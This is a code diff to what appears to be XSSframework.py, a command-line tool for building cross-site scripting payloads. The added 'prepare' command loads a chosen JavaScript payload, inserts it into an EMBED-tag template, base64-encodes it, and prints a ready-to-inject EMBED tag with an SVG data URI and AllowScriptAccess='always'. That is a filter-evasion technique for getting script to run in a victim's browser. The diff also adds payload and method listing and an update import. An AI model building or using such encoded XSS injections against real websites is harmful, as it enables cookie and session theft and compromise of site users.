@@ -6,19 +6,26 @@ try:
     input = raw_input
 except:
     pass
+methodslist = '''    1: Uses base64 encoded SCRIPT embeded in an EMBED tag.
+    2: Empty spot
+    3: Empty spot
+
+'''
 def helpfunc():
     print('''
 --- Commands ---
     payloads: Lists payloads
+    methods: Lists methods
     menu: Return to menu
     exit: Closes XSSframework.py
     help: Shows this screen
-    info <payload name>: Prints <payloadname>.js.info file in command prompt.
-    update <payloads|methods|all>: Updates available payloads or methods
+    info <payload name(str)>: Prints <payloadname>.js.info file in shell.
+    prepare <payload name(str)> <method name(int)>: Prints final payloadjs to screen.
+    update <payloads|methods|all(str)>: Updates available payloads or methods
 ''')
 def xssprompt():
     option = input("XSS:>") + " "
-    command = option.split(" ")
+    command = option.lower().split(" ")
     if (command[0] == "help"):
             helpfunc()
     if (command[0] == "payloads"):
@@ -28,6 +35,8 @@ def xssprompt():
                         print(path.join("\Payloads", file))
             except Exception as err:
                 print(err)
+    if (command[0] == "methods"):
+        print(methodslist)
     if (command[0] == "info"):
             try:
                 print("Info about payload: "+command[1])
@@ -48,15 +57,47 @@ def xssprompt():
     if (command[0] == "update"):
             try:
                 print("Updating: "+command[1])
+                print("Importing XSSupdate.py")
+                import XSSupdate
+                if (command[1] == "payloads"):
+                    XSSupdate.checkPayloads()
+                if (command[1] == "methods"):
+                    pass
+                    #XSSupdate.checkMethods()
             except:
                 print("No parameter given.")
     if (command[0] == "exit"):
         import ExitingXSSframework
-        pass
+    if (command[0] == "prepare"):
+        if (command[1] == " "):
+            print("Payload not chosen.")
+        try:
+            print("Method: "+command[2])
+            #Insert code to execute here.
+            if (command[2] == "1"):
+                payloadjs = open("Payloads\\"+command[1], "r").read()
+                import os
+                script_dir = os.path.dirname(__file__)
+                rel_path = "Methods\\EMBEDtag.method"
+                method_path = os.path.join(script_dir, rel_path)
+                method = open(method_path, "rb").read()
+                #print(str(method).replace("101payloadjs101", payloadjs))
+                encodethis = str(method).replace("101payloadjs101", payloadjs)
+                encodethis = encodethis.replace("b'","").replace("'","")
+                print(encodethis)
+                base64encoded = base64.b64encode(encodethis.encode("utf-8"))
+                output = '''<EMBED SRC="data:image/svg+xml;base64,'''+str(base64encoded)+'''" type="image/svg+xml" AllowScriptAccess="always"></EMBED>'''
+                print('''
+            --- Payload/Exploit XSS code (Encoded): 
+
+            ''')
+                print(output.replace("b'","").replace("'",""))
+                
+        except:
+            print("Method not chosen.")
     else:
         xssprompt()
     xssprompt()
-
 
 def selectmethod():
     print(r'''
@@ -69,15 +110,8 @@ def selectmethod():
 ''')
     print('''
     --- METHODS & XSS shell ---
-    0: XSS command prompt.
-    1: Uses a SVG tag with a SCRIPT tag inside encoded in base64 inside a EMBED tag
-    2: Empty spot
-    3: Empty spot
-
-
-
-
-    ''')
+    0: XSS command prompt.''')
+    print(methodslist)
     methodnr = input("Select a method: ")
     if(int(methodnr) == 1):
         payloadjs = str(input("Paste your JAVASCRIPT here: \n"))
